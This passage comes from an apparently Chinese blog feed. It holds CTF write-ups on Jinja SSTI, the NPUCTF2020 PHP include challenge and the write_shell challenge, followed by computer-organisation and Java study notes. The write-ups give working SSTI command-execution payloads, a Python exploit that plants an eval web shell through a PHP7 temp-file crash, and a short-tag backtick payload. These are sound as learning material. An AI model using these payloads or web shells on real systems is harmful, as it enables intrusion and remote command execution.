__代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __  是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins  __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__  builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112131255.png" alt="image-20220211112131255"></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112532522.png" alt="image-20220211112532522"></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112709595.png" alt="image-20220211112709595"></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112747491.png" alt="image-20220211112747491"></p><p>同理，可以利用的类还有很多啊，</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112931751.png" alt="image-20220211112931751"></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SSTI：&quot;&gt;&lt;a href=&quot;#SSTI：&quot; class=&quot;headerlink&quot; title=&quot;SSTI：&quot;&gt;&lt;/a&gt;SSTI：&lt;/h2&gt;&lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="模板注入" scheme="https://sakurahack-y.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF2020 ezinclude_0x90-0x9F</title>
    <link href="https://sakurahack-y.github.io/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/"/>
    <id>https://sakurahack-y.github.io/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/</id>
    <published>2022-02-13T04:37:09.000Z</published>
    <updated>2022-02-13T06:09:08.453Z</updated>
    
    <content type="html"><![CDATA[<p>最近看了下一些大佬的博客，被打击到了，要学习的有太多了，加油吧！</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124200210.png" alt="image-20220213124200210"></p><p>进去直接来个错误？？？WTF?</p><p>看下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124258414.png" alt="image-20220213124258414"></p><p>疑似哈希长度拓展攻击，抓下包看看</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124348253.png" alt="image-20220213124348253"></p><p>芜湖，hash直接给我了？</p><p>直接传好像不太行?</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124718726.png" alt="image-20220213124718726"></p><p>祭出神器burp</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124626306.png" alt="image-20220213124626306"></p><p>得到文件名 flflflflag.php</p><p>访问一下文件:</p><p>得到如下response</p><pre><code class="html">HTTP/1.1 200 OKServer: openrestyDate: Sun, 13 Feb 2022 04:47:35 GMTContent-Type: text/html; charset=UTF-8Content-Length: 241Connection: closeVary: Accept-EncodingX-Powered-By: PHP/7.0.33&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;include($_GET[&quot;file&quot;])&lt;/body&gt;&lt;/html&gt;</code></pre><p>我已经有了女朋友所以我比出题人强(手动狗头)</p><p>include 函数好家伙，文件包含应该有了</p><p>来读取下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213125612027.png" alt="image-20220213125612027"></p><p>解码如下:</p><pre><code class="php">&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;</code></pre><p>过滤了很多东西，没法命令执行了。</p><p>那就扫一下目录把:</p><p>最终扫出来了一个</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213131840887.png" alt="image-20220213131840887"></p><p>这个目录应该是告诉我们文件的名字，来结合文件包含使用。所以我们就要尝试去传shell</p><p>可以用php7 segment fault特性</p><blockquote><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p></blockquote><p>参考链接；<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这里我们可以直接知道文件名就不需要爆破了</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p><pre><code>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</code></pre><p>payload</p><pre><code class="php">php &lt; 7.2php://filter/string.strip_tags/resource=/etc/passwdphp7 老版本通杀php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>由于tmp目录一般是不可访问的，所以该漏洞常常和文件包含结合起来使用</p><p>exp如下:</p><pre><code class="python">import requestsfrom io import BytesIOurl=&quot;http://ec8f0167-007a-4dd5-84fc-989e567ab77c.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;&quot;files=&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text)</code></pre><p>运行</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213134031132.png" alt="image-20220213134031132"></p><p>这里多了一个文件</p><p>使用蚁剑连接</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135012413.png" alt="image-20220213135012413"></p><p>测试成功了，但是无法添加，，莫名的错误</p><p>同理那就再添加个phpinfo吧</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135404774.png" alt="image-20220213135404774"></p><p>成功找到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近看了下一些大佬的博客，被打击到了，要学习的有太多了，加油吧！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124200210.png&quot; alt=&quot;image-2022</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="代码\命令执行类" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>红明谷CTF 2021 write_shell_0x81-0x8F</title>
    <link href="https://sakurahack-y.github.io/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/"/>
    <id>https://sakurahack-y.github.io/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/</id>
    <published>2022-02-12T02:43:03.000Z</published>
    <updated>2022-02-12T03:24:39.016Z</updated>
    
    <content type="html"><![CDATA[<p>这道题属于比较简单的，让我们来看一下源码</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104506611.png" alt="image-20220212104506611"></p><p>当我们在后缀加上?action=pwd 就可以得到路径</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104652393.png" alt="image-20220212104652393"></p><p>再换成upload就可以写文件</p><p>?action=upload&amp;date=xxx</p><p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p><p>其中过滤了php这个关键词，但是这个可以进行绕过</p><pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。</code></pre><p>PHP中，反引号可以起到命令执行的效果</p><p>空格可以用url编码绕过%09</p><p>由这个我们就可以构造出payload</p><pre><code>?action=upload&amp;data=&lt;?=%09`whoami`?&gt;</code></pre><p>访问文件</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212110632709.png" alt="image-20220212110632709"></p><p>成功执行了命令</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111111008.png" alt="image-20220212111111008"></p><p>直接获取根目录所有文件信息，访问文件，获得flag</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111030856.png" alt="image-20220212111030856"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这道题属于比较简单的，让我们来看一下源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104506611.png&quot; </summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="writeshell" scheme="https://sakurahack-y.github.io/tags/writeshell/"/>
    
  </entry>
  
  <entry>
    <title>计算机组成原理</title>
    <link href="https://sakurahack-y.github.io/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    <id>https://sakurahack-y.github.io/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</id>
    <published>2022-02-11T14:22:04.000Z</published>
    <updated>2022-02-12T15:26:41.110Z</updated>
    
    <content type="html"><![CDATA[<p>前言：由于本人非计算机专业(苦逼化工狗)，所以想要自己补一下计算机的基础，这样才能发展的更远，所以开了这一栏，以后会坚持更新~</p><h1 id="计算机组成原理概述篇"><a href="#计算机组成原理概述篇" class="headerlink" title="计算机组成原理概述篇"></a>计算机组成原理概述篇</h1><h2 id="计算机的发展历史"><a href="#计算机的发展历史" class="headerlink" title="计算机的发展历史"></a>计算机的发展历史</h2><h3 id="计算机发展的四个阶段"><a href="#计算机发展的四个阶段" class="headerlink" title="计算机发展的四个阶段"></a>计算机发展的四个阶段</h3><p>第一个阶段:电子管计算机</p><p>集成度小，空间占用大</p><p>功耗高，运行速度慢</p><p>操作复杂，更换程序需要接线</p><p>第二个阶段:晶体管计算机</p><p>集成度相对较高，空间占用相对小</p><p>功耗相对较低，运行速度快</p><p>操作相对简单，交互更加方便</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211222959451.png" alt="image-20220211222959451"></p><p>第三个阶段:集成电路计算机</p><p>计算机变得更小</p><p>功耗变得更低</p><p>计算速度变得更快</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211223618107.png" alt="image-20220211223618107"></p><p>第四个阶段:超大规模集成电路计算机</p><p>一个芯片集成了上百万的晶体管<br>速度更快，体积更小，价格更低，更能被大众接受</p><p>用途丰富:文本处理，表格处理，高交互的游戏与应用</p><p>第五个阶段:未来计算机</p><p>生物计算机，以蛋白质分子作为主要原材料:</p><p>体积小，效率高</p><p>不易损坏</p><p>不受信号干扰，无热损耗 1</p><p>量子计算机</p><h3 id="微型计算机的发展历史"><a href="#微型计算机的发展历史" class="headerlink" title="微型计算机的发展历史"></a>微型计算机的发展历史</h3><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224519853.png" alt="image-20220211224519853"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224544536.png" alt="image-20220211224544536"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224641392.png" alt="image-20220211224641392"></p><h2 id="计算机的分类"><a href="#计算机的分类" class="headerlink" title="计算机的分类"></a>计算机的分类</h2><p>超级计算机:</p><p>功能最强、运算速度最快、存储容量最大的计算机</p><p>多用于国家高科技领域和尖端技术研究</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225354851.png" alt="image-20220211225354851"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225444783.png" alt="image-20220211225444783"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225558827.png" alt="image-20220211225558827"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225812247.png" alt="image-20220211225812247"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225834345.png" alt="image-20220211225834345"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225944642.png" alt="image-20220211225944642"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230055284.png" alt="image-20220211230055284"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230109064.png" alt="image-20220211230109064"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230145911.png" alt="image-20220211230145911"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230155449.png" alt="image-20220211230155449"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230249731.png" alt="image-20220211230249731"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230318814.png" alt="image-20220211230318814"></p><h2 id="计算机的体系与结构"><a href="#计算机的体系与结构" class="headerlink" title="计算机的体系与结构"></a>计算机的体系与结构</h2><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212231520062.png" alt="image-20220212231520062"></p><p><strong>必须有一个存储器</strong></p><p><strong>必须有一个控制器</strong></p><p><strong>必须有一个运算器</strong></p><p><strong>必须有输入设备</strong></p><p><strong>必须有输出设备</strong></p><p>现代计算机都是冯诺依曼机</p><p>功能:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232001255.png" alt="image-20220212232001255"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232045504.png" alt="image-20220212232045504"></p><p>瓶颈:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232350723.png" alt="image-20220212232350723"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232427464.png" alt="image-20220212232427464"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232520952.png" alt="image-20220212232520952"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232603902.png" alt="image-20220212232603902"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：由于本人非计算机专业(苦逼化工狗)，所以想要自己补一下计算机的基础，这样才能发展的更远，所以开了这一栏，以后会坚持更新~&lt;/p&gt;
&lt;h1 id=&quot;计算机组成原理概述篇&quot;&gt;&lt;a href=&quot;#计算机组成原理概述篇&quot; class=&quot;headerlink&quot; title=&quot;计</summary>
      
    
    
    
    <category term="计算机基础" scheme="https://sakurahack-y.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="计算机组成原理" scheme="https://sakurahack-y.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机组成原理" scheme="https://sakurahack-y.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>java学习之旅</title>
    <link href="https://sakurahack-y.github.io/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/"/>
    <id>https://sakurahack-y.github.io/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/</id>
    <published>2022-02-11T08:00:26.000Z</published>
    <updated>2022-03-24T07:11:18.192Z</updated>
    
    <content type="html"><![CDATA[<p>本篇文章更新java系列知识—持续更新中</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211163044997.png" alt="image-20220211163044997"></p><h1 id="day1-java初识"><a href="#day1-java初识" class="headerlink" title="day1  java初识"></a>day1  java初识</h1><h2 id="第一个HelloWord程序"><a href="#第一个HelloWord程序" class="headerlink" title="第一个HelloWord程序"></a>第一个HelloWord程序</h2><pre><code class="java">/*这里HelloWord是类名void main 是方法，也是程序的入口void 空main 主函数*/class HelloWord&#123;    public static void main(String[] args)&#123;                System.out.println(&quot;Hello Word!&quot;);    &#125;&#125;</code></pre><p>首先用 javac helloword.java –&gt;编译为   helloword.class</p><p>然后 java helloword 执行(这里注意不要加后缀!)</p><p>结果如下：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211171119785.png" alt="image-20220211171119785"></p><p>注意点:</p><p>1、java中严格区分大小写</p><p>2、要记得更改编辑器的编码方式 要保持编码一致才能运行</p><p>3、每一行语句结束必须以;结束</p><p>4、注意缩进</p><p>5、类名是什么，生成的字节码文件是什么，与原文件名字没有直接关系。</p><p>6、当类是公共的，既用public修饰类，类名必须与文件名保持一致</p><p>7、一个java文件中可以有多个类，每个类在编译后都会生成一个字节码文件。</p><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210820972.png" alt="image-20220211210820972"></p><p>关键字有：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210537067.png" alt="image-20220211210537067"></p><p>其中const和goto是保留字</p><h2 id="规范"><a href="#规范" class="headerlink" title="规范:"></a>规范:</h2><p>1、见名知意</p><p>2、驼峰命名</p><p>当变量名 方法名 参数名 由两个或两个单词以上组成时，从第二个单词开始首字母大写</p><p>如：userName passWord</p><p>3、对常量进行命名时，每个单词的字母都大写，而且单词与单词之间使用_相连</p><p>如: MAX_NUM</p><p>4、对类进行命名时，对每一个单词的首字母大写</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>基本数据类型(四类八种):</p><p>整数型:</p><p>​        byte 字节类型        short         int         long</p><p>浮点类型:</p><p>​        float 单精度        double 双精度</p><p>字符型: </p><p>​        char</p><p>布尔型:</p><p>​        boolean:</p><p>​            true        false</p><p>引用类型数据:字符串 类 接口</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p> 字符串常量            浮点类型常量             字符常量           布尔类型常量            内置的常量</p><p>“HelloWoerd”                3.14                         ‘你’                        true                       Math.PI</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>在程序执行过程中，其值可以改变的量</p><p>三要素:</p><p>变量类型        变量名        变量值</p><p>如何申明变量?</p><p>数据类型+变量名</p><p>申明整数类型变量:</p><p>byte b;        long 1;</p><p>同理可生成</p><p>float f;    double d;    char c;    String s;</p><p>在方法内的变量 申明后要赋值才能使用</p><p>变量的实质就是申请内存</p><h1 id="day2-java基础语法"><a href="#day2-java基础语法" class="headerlink" title="day2  java基础语法"></a>day2  java基础语法</h1><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换:"></a>进制转换:</h2><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            System.out.println(666);   //十进制            System.out.println(0b1010011010); //二进制  0b开头            System.out.println(01232);  //八进制 0开头            System.out.println(0x29a); //十六进制 0x开头            &#125;&#125;</code></pre><p>输出结果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154216121.png" alt="image-20220212154216121"></p><h2 id="计算机存储单位"><a href="#计算机存储单位" class="headerlink" title="计算机存储单位"></a>计算机存储单位</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154344804.png" alt="image-20220212154344804"></p><p>1 byte = 8 bit;  没有符号的范围: 2^8-1  有符号(第一位做符号位): -128 - 127</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212160938532.png" alt="image-20220212160938532"></p><p>整数类型   注意:</p><p>1、整数类型，默认的数据类型是int</p><p>2、错误：不兼容的类型：从int转换到byte可能有损失</p><p>当我们赋的值在byte或者short的范围内则不会有变化</p><p>但是当赋的值不在byte或者short的范围内则会将此值作为int类型处理<br>3、错误:过大的整数：2222222222</p><p>生命long类型数值的时候，要在数值的末尾+L</p><p>浮点类型    注意:</p><p>1、浮点类型 默认的数据类型是double</p><p>2、不兼容的类型：从double转换到float可能会有损失</p><p>申明float类型的数据 要在数值的末尾 +  F</p><p>float f =3.14F</p><p>3、浮点类型底层采用的是科学计数法方式</p><p>4、小数底层存储方式与整数不同  有符号位 指数位 整数位</p><p>5、小数不能精确的表示一个值 (如果要精确的表示需要用到bigdecimal)</p><h2 id="计算机如何存储数据"><a href="#计算机如何存储数据" class="headerlink" title="计算机如何存储数据"></a>计算机如何存储数据</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172832527.png" alt="image-20220212172832527"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172817453.png" alt="image-20220212172817453"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173056936.png" alt="image-20220212173056936"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173119494.png" alt="image-20220212173119494"></p><h2 id="自动类型提升"><a href="#自动类型提升" class="headerlink" title="自动类型提升"></a>自动类型提升</h2><p>基本类型数据转换:</p><p>1、自动类型提升</p><p>小的数据类型 可以自动转换为大的数据类型</p><pre><code class="java">int d = 3;double f = d;</code></pre><p>2、强制类型转换</p><p>错误：不兼容的类型，从double转换到int可能会有损失</p><p> 强制转换的公式:</p><p>小的数据类型 标识符 = (小的数据类型)大的数据类型</p><pre><code class="java">double d = 3.14;int num = (int)d;</code></pre><p>特殊情况</p><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            int a = 200;            byte b = (byte)a;            System.out.println(b);        &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221045664.png" alt="image-20220212221045664"></p><p>为什么这里是-56呢？</p><p>首先我们知道 int是四个字节，而byte只有一个字节，200的二进制数为 11001000</p><p>刚好byte可以全部接受，但是byte第一位是符号位，首位是1，所以是负数，计算机的存储方式是以补码的形式存储。11001000—&gt;10110111(反码)—&gt;10111000(补码)</p><p>转化为十进制就是-56</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221721358.png" alt="image-20220212221721358"></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222704014.png" alt="image-20220212222704014"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222746808.png" alt="image-20220212222746808"></p><p>注意:</p><p>1、整数相除，不保留小数</p><p>2、如果想要显示小数，使用浮点类型计算</p><p>3、 byte与byte  short与short char与char 做运算，或者他们之间混合运算，则结果会变为int类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212225720878.png" alt="image-20220212225720878"></p><p>使用赋值运算符是不会发生类型转换的</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212230210588.png" alt="image-20220212230210588"></p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220213150338148.png" alt="image-20220213150338148"></p><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220213150648548.png" alt="image-20220213150648548"></p><h1 id="day3-流程控制语句"><a href="#day3-流程控制语句" class="headerlink" title="day3  流程控制语句"></a>day3  流程控制语句</h1><h2 id="输入语句-scanner"><a href="#输入语句-scanner" class="headerlink" title="输入语句 scanner"></a>输入语句 scanner</h2><pre><code class="java">import java.util.*;class InputTest&#123;    public static void 